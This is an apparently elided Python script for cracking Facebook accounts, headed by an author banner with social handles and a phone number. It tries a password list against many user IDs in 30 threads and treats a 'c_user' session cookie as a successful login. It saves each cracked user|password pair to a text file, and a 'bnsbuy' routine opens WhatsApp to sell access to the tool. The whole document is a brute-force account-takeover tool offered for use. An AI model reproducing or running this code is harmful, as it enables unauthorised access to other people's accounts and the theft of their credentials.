...
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : Arafat
 
\033[0;93mFACEBOOK : PrinceArafat770
 
\033[0;96mGITHUB   : PRINCE-ARAFAT   ......  WhatsApp : 01943520447
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mSHAKIL_CP.txt' % (H, P, str(len(cp))))
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[ARAFAT-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('ARAFAT_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # SHAKIL TUHIN BANGLADESH HACKER
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
...
def bnsbuy():
    ...
    if to in r:
        ...
        os.system('am start https://wa.me/01943520447?text=' + tks)
